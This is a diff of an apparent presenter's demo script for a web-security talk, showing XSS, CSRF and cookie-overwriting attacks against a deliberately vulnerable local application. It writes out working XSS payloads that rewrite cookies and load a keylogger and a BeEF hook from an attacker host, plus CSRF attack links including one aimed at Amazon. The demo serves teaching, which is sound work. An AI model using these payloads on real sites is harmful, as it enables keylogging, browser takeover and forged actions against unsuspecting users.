@@ -1,6 +1,6 @@
 BadGuy
 Chrome	https://local.1-liner.org:8444/vulnerable/
-		https://local.1-liner.org:8444/admin/          <-- Change name
+		https://local.1-liner.org:8444/admin/          <-- Change name to BadGuy
                 https://attackr.se:8444                <-- Accept cert
                 https://lolsite.com:8444               <-- Accept cert
 John
@@ -10,13 +10,19 @@ FF	    https://local.1-liner.org:8444/vulnerable/
 
 *** XSS fight
 
-Show username "John" in FF
+Show username "John" in FF and "BadGuy" in Chrome.
 
-I love JavaScript<img src=1 onerror=if(Ext.util.Cookies.get("nickNameVulnerable")!="BadGuy"){Ext.util.Cookies.set("nickNameVulnerable","Moron");} height=0 width=0 />
+BadGuy posts: I love JavaScript<img src=1 onerror=if(document.cookie.indexOf("BadGuy")===-1){document.cookie="nickNameVulnerable=Moron;domain=.1-liner.org;path='/'";} height=0 width=0 />
 
-It's EcmaScript, fool<img src=1 onerror=$.getScript('https://attackr.se:8444/attacks/keylogger.js') height=0 width=0 />
+John posts:   It's EcmaScript, fool<img src=1 onerror=$.getScript('https://attackr.se:8444/attacks/keylogger.js') height=0 width=0 />
 
-Besserwisser<img src=1 onerror=$.getScript('https://attackr.se:8444/attacks/hook.js') height=0 width=0 />
+Show the server log and let BadGuy type some stuff in the input field (keylogger)
+
+Make sure you running BeEF (execute ./beef in the BeEF folder)
+
+BadGuy posts: Besserwisser<img src=1 onerror=$.getScript('https://attackr.se:8444/attacks/hook.js') height=0 width=0 />
+
+BadGuy opens: http://attackr.se:3000/ui/panel
 
 *** Remove XSS, reload John, and switch to BadGuy
 
@@ -26,12 +32,40 @@ Besserwisser<img src=1 onerror=$.getScript('https://attackr.se:8444/attacks/hook
 
 *** Remove encoding fix and switch to BadGuy
 
-LOL, check the dancing pig: https://lolsite.com:8444/attacks/csrf/csrf.html
 
-Über LOL, check out the cat: https://lolsite.com:8444/attacks/csrf/csrf2.html
+*** CSRF fight
 
-*** Make sure BadGuy is logged in at Amazon
+BadGuy posts: LOL, check the dancing pig: https://lolsite.com:8444/attacks/csrf/csrf.html
+
+Point out that the link goes to another domain (it will auto-post cross-domain)
+
+BadGuy posts: Über LOL, check out the cat: https://lolsite.com:8444/attacks/csrf/csrf2.html
+
+Make sure BadGuy is logged in at Amazon (remember me)
 
 John (FF) to BadGuy (Chrome):
 
 Hey BadGuy, check this out: https://attackr.se:8444/attacks/csrf/amazon/csrfMultiDriver.html
+
+
+*** Subdomain XSS to set anti-CSRF cookie
+
+BadGuy: https://local.1-liner.org:8444/securish/
+
+BadGuy posts: Hey, this works!
+
+Kill the cookie named cookieToken.
+
+BadGuy posts: Will this work?
+
+Show server log.
+
+Reload https://local.1-liner.org:8444/securish/
+
+BadGuy posts: It works again
+
+BadGuy: https://other.1-liner.org:8444/vulnerable/simpleXSS.jsp
+
+XSS <script>$.cookie("cookieToken", "bogus", {path: "/", domain: ".1-liner.org"});</script>
+
+BadGuy posts: Huh?
